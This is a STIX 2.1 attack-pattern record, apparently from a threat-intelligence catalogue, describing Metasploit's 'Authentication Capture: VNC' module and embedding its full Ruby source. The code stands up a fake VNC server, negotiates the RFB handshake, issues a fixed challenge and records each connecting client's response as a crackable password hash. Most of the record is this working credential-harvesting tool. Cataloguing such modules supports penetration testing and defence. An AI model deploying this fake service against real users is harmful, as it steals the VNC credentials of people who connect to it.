{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--496e86c1-298f-453f-a9c6-e0210bf9c6cf",
    "created": "2024-08-14T16:22:00.821572Z",
    "modified": "2024-08-14T16:22:00.821576Z",
    "name": "Authentication Capture: VNC",
    "description": " This module provides a fake VNC service that is designed to capture authentication credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/vnc.rb",
            "external_id": "vnc.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n\n  def initialize\n    super(\n      'Name' => 'Authentication Capture: VNC',\n      'Description' => %q{\n        This module provides a fake VNC service that\n      is designed to capture authentication credentials.\n      },\n      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',\n      'License' => MSF_LICENSE,\n      'Actions' => [[ 'Capture', { 'Description' => 'Run VNC capture server' } ]],\n      'PassiveActions' => [ 'Capture' ],\n      'DefaultAction' => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 5900 ]),\n        OptString.new('CHALLENGE', [ true, 'The 16 byte challenge', '00112233445566778899AABBCCDDEEFF' ])\n      ]\n    )\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{32})$/\n      @challenge = [ datastore['CHALLENGE'] ].pack('H*')\n    else\n      fail_with(Failure::BadConfig, 'CHALLENGE must be 32 characters, 0-9,A-F.')\n    end\n    exploit\n  end\n\n  def on_client_connect(c)\n    @state[c] = {\n      name: \"#{c.peerhost}:#{c.peerport}\",\n      ip: c.peerhost,\n      port: c.peerport,\n      pass: nil,\n      chall: nil,\n      proto: nil\n    }\n\n    c.put \"RFB 003.007\\n\"\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :nonreplayable_hash,\n      jtr_format: Metasploit::Framework::Hashes.identify_hash(opts[:password])\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_client_data(c)\n    data = c.get_once\n    return if !data\n\n    peer = \"#{c.peerhost}:#{c.peerport}\"\n\n    if data =~ /^RFB (.*)\\n$/\n      @state[c][:proto] = Regexp.last_match(1)\n      if @state[c][:proto] == '003.007'\n        # for the 003.007 protocol we say we support the VNC sectype\n        # and wait for the server to acknowledge it, before we send the\n        # challenge.\n        c.put [0x0102].pack('n') # 1 sectype, unencrypted\n      elsif @state[c][:proto] == '003.003'\n        # for the 003.003 protocol we say we support the VNC sectype\n        # and immediately send the challenge\n        sectype = [0x00000002].pack('N')\n        c.put sectype\n\n        @state[c][:chall] = @challenge\n        c.put @state[c][:chall]\n      else\n        c.close\n      end\n    # the challenge was sent, so this should be our response\n    elsif @state[c][:chall]\n      c.put [0x00000001].pack('N')\n      c.close\n      print_good(\"#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}\")\n      hash_line = \"*#{@state[c][:chall].unpack('H*')[0]}*#{data.unpack('H*')[0]}\"\n      report_cred(\n        ip: c.peerhost,\n        port: datastore['SRVPORT'],\n        service_name: 'vnc_client',\n        user: '',\n        password: hash_line,\n        proof: hash_line\n      )\n\n    # we have got the protocol sorted out and have offered the VNC sectype (2)\n    elsif @state[c][:proto] == '003.007'\n      if (data.unpack('C')[0] != 2)\n        print_error(\"#{peer} - sectype not offered! #{data.unpack('H*')}\")\n        c.close\n        return\n      end\n      @state[c][:chall] = @challenge\n      c.put @state[c][:chall]\n    end\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\nend\n"
}